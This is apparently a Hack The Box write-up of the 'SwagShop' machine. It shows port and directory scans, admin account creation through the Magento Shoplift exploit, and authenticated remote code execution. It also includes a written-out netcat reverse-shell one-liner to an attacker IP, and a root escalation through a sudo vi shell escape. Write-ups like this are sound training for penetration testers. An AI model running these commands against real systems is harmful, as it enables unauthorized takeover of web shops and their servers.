1,Recon
port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

page check
![](images/Pasted%20image%2020241217083018.png)

Then I would continue to enumerate the web-contents.
```
/media                (Status: 301) [Size: 312] [--> http://swagshop.htb/media/]
/includes             (Status: 301) [Size: 315] [--> http://swagshop.htb/includes/]
/lib                  (Status: 301) [Size: 310] [--> http://swagshop.htb/lib/]
/app                  (Status: 301) [Size: 310] [--> http://swagshop.htb/app/]
/js                   (Status: 301) [Size: 309] [--> http://swagshop.htb/js/]
/shell                (Status: 301) [Size: 312] [--> http://swagshop.htb/shell/]
/skin                 (Status: 301) [Size: 311] [--> http://swagshop.htb/skin/]
/var                  (Status: 301) [Size: 310] [--> http://swagshop.htb/var/]
/errors               (Status: 301) [Size: 313] [--> http://swagshop.htb/errors/]
/mage                 (Status: 200) [Size: 1319]
/server-status        (Status: 403) [Size: 277]

```

To be honest, in this place, nothing useful for us.

So I would try to get the exploits and try them to hope they gonna worked.
Looking at both Google and searchsploit, I’l find a bunch of exploits for Magento. First, I’ll use one called “shoplift” exploit to add an admin user. I’ll download the python script and run it:
```
python2 poc.py 10.10.10.140                                                             
WORKED
Check http://10.10.10.140/admin with creds ypwq:123

```

Then we can login successfully into `http://10.10.10.140/index.php/admin`
![](images/Pasted%20image%2020241217083904.png)
And we can also get the version `Magento ver. 1.9.0.0` from the bottom of this page.
from `searchsploit` we can find something useful
```
searchsploit Magento          
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity  | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script  | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Sess | php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/contro | php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scr | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code  | php/webapps/37811.py
Magento eCommerce - Local File Disclosure           | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution           | xml/webapps/37977.py
Magento eCommerce CE v2.3.5-p2 - Blind SQLi         | php/webapps/50896.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilit | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File I | php/webapps/35052.txt
Magento ver. 2.4.6 - XSLT Server Side Injection     | multiple/webapps/51847.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 | php/webapps/48135.php
---------------------------------------------------- ---------------------------------
```
`Magento CE < 1.9.0.1 - (Authenticated) Remote Code  | php/webapps/37811.py` seems like a good choice for us.

In this place, because of python2, the exploit script seems like not valid or good here.
So i prefer another one `https://github.com/Hackhoven/Magento-RCE.git`

```
python3 magento-rce-exploit.py http://swagshop.htb/index.php/admin/ whoami
Form name: None
Control name: form_key
Control name: login[username]
Control name: dummy
Control name: login[password]
Control name: None
www-data

So the rce payload would be 
python3 magento-rce-exploit.py 'http://swagshop.htb/index.php/admin' "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 443 >/tmp/f"
```

In this place, I could not find any configurations.
But I found 
```
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

From GTBOBins
```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo vi -c ':!/bin/sh' /dev/null

so in this place, 
sudo vi /var/www/html/test -c ':!/bin/sh' /dev/null
Then we can get the root shell.
```